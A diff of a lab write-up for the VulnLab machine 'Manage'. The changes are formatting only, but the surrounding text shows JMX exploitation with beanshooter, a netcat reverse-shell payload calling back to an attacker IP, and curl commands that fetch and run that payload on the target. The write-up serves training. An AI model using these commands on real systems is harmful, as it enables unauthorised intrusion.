@@ -18,7 +18,7 @@ Manage is an **EASY** machine on [VulnLab](https://wiki.vulnlab.com/guidance/eas
 ## Enumeration
 ### Nmap
 
-```
+```console
 PORT      STATE SERVICE    REASON         VERSION
 22/tcp    open  ssh        syn-ack ttl 63 OpenSSH 8.9p1 Ubuntu 3ubuntu0.7 (Ubuntu Linux; protocol 2.0)
 | ssh-hostkey:
@@ -74,7 +74,7 @@ Managed Beans, or MBeans, are a fundamental concept of the JMX API. The JMX spec
 
 We can use the [Beanshooter](https://github.com/qtc-de/beanshooter) tool to enumerate the `jmxrmi` service and ultimately exploit the service to get a foothold on the box.
 
-```
+```console
 ➜  manage $ beanshooter enum $ip 2222                                                                                          
 Picked up _JAVA_OPTIONS: -Dawt.useSystemAAFontSettings=on -Dswing.aatext=true
 [+] Checking available bound names:
@@ -132,13 +132,13 @@ After looking through the documentation, it's possible to get code execution by 
 
 There are probably multiple ways to do this, but I put the following payload in a file and saved it as `shell.sh`
 
-```
+```console
 rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc 10.8.2.86 9001 >/tmp/f
 ```
 
 We can use `beanshooter` to grab the `shell.sh` file from our attacker machine. Please note that I have an alias set up for 'beanshooter' that runs the JAR file. 
 
-```
+```console
 ➜  manage $ beanshooter standard $ip 2222 exec 'curl http://10.8.2.86:8000/shell.sh -o /dev/shm/shell.sh'
 Picked up _JAVA_OPTIONS: -Dawt.useSystemAAFontSettings=on -Dswing.aatext=true
 [+] Creating a TemplateImpl payload object to abuse StandardMBean
@@ -155,7 +155,7 @@ Picked up _JAVA_OPTIONS: -Dawt.useSystemAAFontSettings=on -Dswing.aatext=true
 
 Once the `shell.sh` file is on the target machine we can execute it with the following:
 
-```
+```console
 ➜  manage $ beanshooter standard $ip 2222 exec 'sh /dev/shm/shell.sh'
 Picked up _JAVA_OPTIONS: -Dawt.useSystemAAFontSettings=on -Dswing.aatext=true
 [+] Creating a TemplateImpl payload object to abuse StandardMBean
@@ -175,7 +175,7 @@ When that runs we get a shell as the `tomcat` user and can grab the `user.txt` f
 
 Looking around the file system, we find a backups directory in the `/home/useradmin` folder. 
 
-```
+```console
 tomcat@manage:/home/useradmin/backups$ ls -la
 ls -la
 total 12
